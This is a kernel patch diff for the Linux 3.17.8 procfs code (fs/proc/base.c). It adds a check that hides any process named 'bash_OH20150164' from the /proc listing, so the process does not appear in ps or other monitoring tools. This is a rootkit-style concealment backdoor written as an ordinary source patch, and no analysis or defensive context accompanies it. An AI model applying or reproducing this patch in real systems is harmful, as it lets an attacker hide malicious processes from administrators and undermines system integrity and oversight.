@@ -1,0 +1,17 @@
+diff -urN ./linux-3.17.8-200.fc20.x86_64/fs/proc/base.c linux-3.17.8-200.fc20.x86_64-patched/fs/proc/base.c
+--- ./linux-3.17.8-200.fc20.x86_64/fs/proc/base.c	2015-01-22 13:45:49.437035105 +0100
++++ linux-3.17.8-200.fc20.x86_64-patched/fs/proc/base.c	2015-01-22 13:52:41.994776133 +0100
+@@ -2900,6 +2900,13 @@
+ 		if (!has_pid_permissions(ns, iter.task, 2))
+ 			continue;
+ 
++        task_lock(iter.task);
++        if (strcmp(iter.task->comm, "bash_OH20150164") == 0) {
++            task_unlock(iter.task);
++            continue;
++        }
++        task_unlock(iter.task);
++
+ 		len = snprintf(name, sizeof(name), "%d", iter.tgid);
+ 		ctx->pos = iter.tgid + TGID_OFFSET;
+ 		if (!proc_fill_cache(file, ctx, name, len,
